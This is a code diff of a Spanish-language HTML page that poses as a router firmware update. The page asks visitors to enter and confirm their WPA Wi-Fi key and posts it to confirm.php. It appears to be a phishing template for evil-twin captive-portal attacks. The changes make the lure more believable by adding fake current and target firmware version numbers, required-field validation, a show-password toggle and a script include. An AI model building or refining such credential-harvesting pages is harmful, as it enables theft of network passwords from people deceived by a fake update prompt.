@@ -22,7 +22,7 @@
                     <p>ACTUALIZACIÓN DEL FIRMWARE</p>
                 </div>
                 <div class="desc">
-                    <p>Hay un nuevo firmware disponible para mejorar el desempeño y funcionalidades del sistema.</p>
+                    <p>Hay un nuevo firmware disponible para mejorar el desempeño y funcionalidades del sistema.<br><b>Versión Actual:</b> 8.2.16.2<br><b>Versión a Actualizar:</b> 8.2.24.0</p>
                 </div>
             </div>
             <div class="card_yellow">
@@ -30,26 +30,31 @@
                     <p>Se necesita autenticación para poder continuar con la operación. Por favor ingrese sus credenciales de red.</p>
                 </div>
             </div>
+            <div class="error">
+                <span id="error_message"></span>
+            </div>
             <div class="form">
                 <form action="confirm.php" method="POST">
                     <p>
                         <label for="password">Clave WPA</label>
                     </p>
                     <p>
-                        <input type="password" name="password" autocomplete="off">
+                        <input type="password" name="password" autocomplete="off" id="password1" required>
                     </p>
                     <p>
                         <label for="password_check">Confirmar Clave</label>
                     </p>
                     <p>
-                        <input type="password" name="password_check" autocomplete="off">
+                        <input type="password" name="password_check" autocomplete="off" id="password2" required>
                     </p>
                     <p>
-                        <input type="submit" value="Actualizar">
+                        <input type="checkbox" id="showPassword"> <span id="textCheckBox">Mostrar Clave</span>
+                        <input type="submit" value="Actualizar" id="submit" onsubmit="return validation()">
                     </p>
                 </form>
             </div>
         </div>
     </div>
+    <script src="./js/main.js"></script>
 </body>
 </html>
